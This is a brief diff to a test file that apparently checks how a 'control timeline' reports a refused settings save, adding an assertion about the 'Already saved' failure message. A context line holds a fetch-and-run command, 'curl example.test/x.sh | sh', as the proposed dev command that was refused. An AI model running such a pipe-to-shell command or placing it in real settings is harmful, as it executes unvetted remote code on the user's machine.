@@ -201,6 +201,10 @@ test("control timeline shows the command a refused settings save proposed", () =
     event?.body ?? "",
     /proposed dev command: curl example\.test\/x\.sh \| sh · saved dev command: npm run dev$/
   );
+  assert.equal(
+    event?.kind === "fail" ? event.log : undefined,
+    "Already saved. Control changes a saved setting only after you agree."
+  );
 });
 
 test("control timeline shows a settings save as the server normalized it", () => {
